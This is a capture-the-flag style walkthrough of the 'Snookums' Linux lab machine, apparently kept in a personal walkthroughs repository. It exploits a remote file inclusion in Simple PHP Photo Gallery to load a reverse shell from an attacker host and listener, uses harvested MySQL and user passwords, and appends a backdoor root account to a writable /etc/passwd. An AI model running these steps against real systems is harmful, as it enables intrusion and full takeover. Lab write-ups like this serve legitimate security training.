# 🐚 Snookums (Linux)

## 🌐 Initial Foothold

- Opened ports: `21`, `22`, `80`, `111`, `139`, `445`, `3306`, `33060`
- Discovered **Simple PHP Photo Gallery v0.8** on port `80`
- Found known RFI vulnerability ([Exploit-DB 48424](https://www.exploit-db.com/exploits/48424))

### 📥 Exploiting RFI
- Used reverse shell: `/usr/share/webshells/php/php-reverse-shell.php`
- Updated:
  ```php
  $ip = '192.168.118.3';
  $port = 445;
  ```
- Started web server:
  ```bash
  sudo python3 -m http.server 80
  ```
- Started listener:
  ```bash
  nc -lvp 445
  ```
- Triggered reverse shell:
  ```
  http://192.168.120.135/image.php?img=http://192.168.118.3/shell.php
  ```

## 🐾 Privilege Escalation

### 🔑 Step 1: MySQL Root Access

- Credentials found in `/var/www/html/db.php`:
  ```
  root : MalapropDoffUtilize1337
  ```
- Connected:
  ```bash
  mysql -u root -p
  ```
- Discovered Base64 encoded passwords in `SimplePHPGal.users` table.
- Decoded twice:
  - `josh` : `MobilizeHissSeedtime747`
  - `michael` : `HockSydneyCertify123`
  - `serena` : `OverallCrestLean000`

### 🧠 Step 2: SSH to michael

- Logged in:
  ```bash
  ssh michael@192.168.120.135
  ```
- Found `/etc/passwd` is writable:
  ```bash
  ls -lah /etc/passwd
  ```

### 👑 Step 3: Create Root User

- Created password hash:
  ```bash
  openssl passwd -1 -salt GitRekt pwn1337
  ```
- Appended to `/etc/passwd`:
  ```
  echo 'GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash' >> /etc/passwd
  ```
- Logged in as root:
  ```bash
  ssh GitRekt@192.168.120.135
  ```

---

## ✅ Git Commands

```bash
# Move the file to the linux walkthroughs folder
mv ~/Downloads/Snookums.md ~/Downloads/walkthroughs_project_template/linux/Snookums.md

# Change directory to the project root
cd ~/Downloads/walkthroughs_project_template

# Add all changes to git
git add .

# Commit the changes with a descriptive message
git commit -m "Added Snookums (Linux) walkthrough"

# Push the commit to GitHub
git push
```